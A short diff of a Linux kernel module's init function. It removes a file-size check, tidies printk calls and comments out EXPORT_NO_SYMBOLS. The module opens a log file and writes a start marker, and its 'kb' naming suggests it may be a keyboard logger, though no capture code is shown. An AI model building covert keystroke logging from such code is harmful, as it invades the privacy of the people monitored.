@@ -309,12 +309,7 @@ static int __init kb_init(void)
 		return 1;
 	}
 	else{
-		printk("SUCCESSFULLY opened log file.\n");
-		unsigned int size = 0;
-		struct kstat stat;
-		memset(&stat, 0, sizeof(stat));
-		size = vfs_fstat(NAME, &stat);
-		printk("FILE SIZE: %d\terr=%d\n", (int)stat.size, size);
+		printk(KERN_INFO "SUCCESSFULLY opened log file.\n");
 		unsigned char buf[32];
 		memset(buf, 0, sizeof(buf));
 		strcpy(buf, "-LOG START-\n\n");
@@ -343,4 +338,4 @@ MODULE_LICENSE("GPL");
 module_init(kb_init);
 module_exit(kb_exit);
 
-EXPORT_NO_SYMBOLS;
+/* EXPORT_NO_SYMBOLS; */
